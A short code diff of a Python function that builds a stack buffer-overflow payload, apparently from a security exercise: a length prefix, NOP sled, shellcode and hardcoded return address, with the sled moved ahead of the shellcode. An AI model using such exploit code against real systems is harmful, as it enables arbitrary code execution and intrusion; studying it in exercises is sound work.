@@ -64,13 +64,13 @@ def get_payload() -> bytes:
     """
     
     
-    payload_length = 1044 # = shellcode + nops + 4 bytes of return address
-    size = struct.pack('>I', payload_length)
+    size = 1044 # = shellcode size
     asm = get_shellcode()
-    NOPs = bytes([0x90 for i in range(938 - len(asm))]) #not including the 4 bytes of the return address
+    NOPs_amount = size - len(asm) - 4
+    NOPs = bytes([0x90 for i in range(NOPs_amount)])
     ra = struct.pack('<I', 0xBFFFDD9C) #return address
-    before = bytes([0x90 for i in range(102)])
-    return size + before + asm + NOPs + ra
+
+    return struct.pack('>I', size) + NOPs + asm + ra
     
 
 def main():
